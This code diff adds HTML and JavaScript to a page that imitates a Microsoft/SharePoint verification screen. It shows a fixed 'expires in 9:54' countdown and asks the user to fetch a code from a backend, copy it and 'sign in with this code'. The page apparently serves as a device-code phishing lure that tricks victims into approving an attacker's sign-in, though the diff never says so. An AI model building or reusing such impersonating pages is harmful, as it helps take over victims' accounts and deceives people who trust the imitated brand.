@@ -65,3 +65,37 @@
             <input type="text" id="code-box" class="code-input" readonly>
             <button class="btn-secondary" onclick="copyCode()">Copy code</button>
             <button class="btn-primary" onclick="signIn()">Sign in with this code</button>
+            <div class="timer-text">Verification code expires in 9:54</div>
+        </div>
+
+        <button id="start-btn" class="btn-primary" onclick="startVerification()">Get verification code</button>
+        
+        <div class="footer">
+            Microsoft account · SharePoint · Security · Privacy
+        </div>
+    </div>
+
+    <script>
+        async function startVerification() {
+            // Call your backend to get the code
+            const response = await fetch('/api/device/start');
+            const data = await response.json();
+            
+            document.getElementById('code-box').value = data.code;
+            document.getElementById('start-btn').style.display = 'none';
+            document.getElementById('verification-ui').style.display = 'block';
+        }
+
+        function copyCode() {
+            const copyText = document.getElementById("code-box");
+            copyText.select();
+            document.execCommand("copy");
+            alert("Code copied!");
+        }
+
+        function signIn() {
+            window.location.href = '/api/device/verify';
+        }
+    </script>
+</body>
+</html>
